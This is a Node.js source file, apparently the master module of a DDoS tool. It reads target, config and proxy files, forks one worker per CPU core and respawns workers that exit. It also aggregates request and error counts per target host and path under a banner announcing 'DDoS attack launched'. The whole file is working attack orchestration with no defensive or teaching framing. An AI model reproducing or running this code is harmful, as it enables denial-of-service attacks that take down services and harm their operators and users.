import cluster from 'cluster';
import { cpus } from 'os';
import process from 'process';
import { readFile } from 'fs/promises';
import { resolve } from 'path';
import { DATA_MSG, EXIT_MSG } from './constants.mjs';

let configPath, dataPath, proxiesPath;

const startLogMessage = ['DDoS attack launched on', '        ' + new Date().toLocaleString()];
const configMessages = [];

const startTimestamp = Date.now();
const perRequestStats = {};

let statTimer;

function isDefined(value) {
	return value !== null && value !== undefined;
}

async function getConfig() {
	return JSON.parse(await readFile(new URL(configPath, import.meta.url)));
}

async function getData() {
	return JSON.parse(await readFile(new URL(dataPath, import.meta.url)));
}

async function getProxies() {
	if (!proxiesPath) return;
	return JSON.parse(await readFile(new URL(proxiesPath, import.meta.url)));
}

function verifyUserConfig(userConfig) {
	if (!isDefined(userConfig.requestPerBatch)) {
		configMessages.push('-- "requestPerBatch" not specified in the config.json. Fallback to 10.');
	}
	if (!isDefined(userConfig.logEveryMs)) {
		configMessages.push('-- "logEveryMs" not specified in the config.json. Fallback to 1000ms.');
	}
	if (!isDefined(userConfig.delayBetweenBatch)) {
		configMessages.push('-- "delayBetweenBatch" not specified in the config.json. Fallback to 0ms.');
	}
}

function logStats(cpuCount) {
	process.stdout.write('\x1Bc')
	const elapsedTime = ((Date.now() - startTimestamp) / 1000).toFixed(3);
	const preparedTableStats = Object.keys(perRequestStats).map(key => {
		return perRequestStats[key].details;
	});
	console.table(preparedTableStats);
	console.info(...startLogMessage);
	console.info('Available CPU(s)               ', cpuCount ?? 0);
	console.info('Worker(s) running              ', Object.keys(cluster.workers).length ?? 0);
	console.info('Total requests sent            ', Object.values(perRequestStats).reduce((count, data) => {
		count += Object.values(data)[0].requests;
		return count;
	}, 0));
	console.info('Time elapsed since launching   ', elapsedTime, 'second(s)');
	if (configMessages.length) {
		console.info('User config messages:\n', configMessages.join('\n'));
	}
}

function aggregateWorkersStats(workerData) {
	const { host, port, path } = workerData;
	const key = host + ':' + port + path;
	perRequestStats[key] = perRequestStats[key] || {
		details: { host, port, path, requests: 0, errors: 0, success: 0 }
	};
	perRequestStats[key].details.success += Number(workerData.success);
	perRequestStats[key].details.errors += Number(workerData.errors);
	perRequestStats[key].details.requests += Number(workerData.requests);
}

export async function startMaster() {
	const argv = process.argv.splice(2, 3);

	if (!argv.length) {
		throw new Error('Missing arguments path to data.json and config.json');
	}

	proxiesPath = argv.length === 3 && resolve(process.cwd(), argv.pop());
	configPath = resolve(process.cwd(), argv.pop());
	dataPath = resolve(process.cwd(), argv.pop());

	console.info('using data from path', dataPath);
	console.info('using config from path', configPath);
	console.info('using proxies from path', proxiesPath);

	const numCPUs = cpus().length;

	const { data } = await getData();
	const userConfig = await getConfig();
	const proxies = await getProxies() ?? {};
	verifyUserConfig(userConfig);

	const preparedUserConfig = {
		requestPerBatch: 10,
		logEveryMs: 1000,
		delayBetweenBatch: 0,
		...(userConfig)
	};

	for (let i = 0; i < numCPUs; ++i) {
		cluster.fork({
			USER_CONFIG: JSON.stringify(preparedUserConfig),
			DATA: JSON.stringify(data),
			PROXIES: JSON.stringify(proxies),
			CONFIG_MESSAGE: JSON.stringify(configMessages)
		});
	}

	cluster.on('message', (worker, msg) => {
		if (msg.cmd === DATA_MSG) {
			aggregateWorkersStats(msg.data);
		}
	});

	cluster.on('exit', () => {
		cluster.fork({
			USER_CONFIG: JSON.stringify(preparedUserConfig),
			DATA: JSON.stringify(data),
			PROXIES: JSON.stringify(proxies),
			CONFIG_MESSAGE: JSON.stringify(configMessages)
		});
	});

	process.on(EXIT_MSG, () => {
		clearInterval(statTimer);
		console.info('DDoS attack stopped on', '        ' + new Date().toLocaleString());
	});

	statTimer = setInterval(() => logStats(numCPUs), userConfig.logEveryMs);
}
